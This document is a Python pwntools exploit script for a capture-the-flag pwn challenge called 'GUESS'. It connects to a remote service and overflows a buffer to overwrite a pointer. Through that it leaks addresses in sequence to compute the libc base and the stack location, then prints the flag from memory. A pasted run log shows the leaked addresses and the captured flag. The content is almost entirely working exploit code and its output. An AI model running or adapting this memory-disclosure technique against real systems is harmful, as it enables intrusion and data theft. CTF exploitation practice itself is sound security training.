from pwn import *
#r=process('./GUESS')
r=remote('106.75.90.160',9999)
r.recvuntil('flag\n')
r.sendline('a'*296+p64(0x602020))
r.recvuntil(': ')
leak1=r.recv(6).strip().ljust(8,'\x00')
base=u64(leak1)-0x6f690
log.success('puts_leak:'+str(hex(u64(leak1))))
log.success('libc_base:'+str(hex(base)))
#http://118.89.148.197:8080/d/libc6_2.23-0ubuntu10_amd64.symbols
#r.recvuntil('flag\n')
#r.sendline('a'*296+p64(0x602040))
#r.recvuntil(': ')
#leak2=r.recv(6).strip().ljust(8,'\x00')
#log.success('read_leak:'+str(hex(u64(leak2))))

r.recvuntil('flag\n')
r.sendline('a'*296+p64(base+0x3c6f38))
r.recvuntil(': ')
leak3=r.recv(6).strip().ljust(8,'\x00')
stack=u64(leak3)-416
log.success('stack_base:'+str(hex(stack)))
raw_input()

r.recvuntil('flag\n')
r.sendline('a'*296+p64(stack+0x38))
r.recvuntil(': ')
print r.recv()
'''
cossack@ubuntu:~/Desktop/PWN/WangDing$ python exp0.py 
[+] Opening connection to 106.75.90.160 on port 9999: Done
[+] puts_leak:0x7fc95f910690
[+] libc_base:0x7fc95f8a1000
[+] stack_base:0x7ffca45e84b8

flag{936dd5d1-457a-413d-ae5d-bbd55136e524} terminated

[*] Closed connection to 106.75.90.160 port 9999

'''
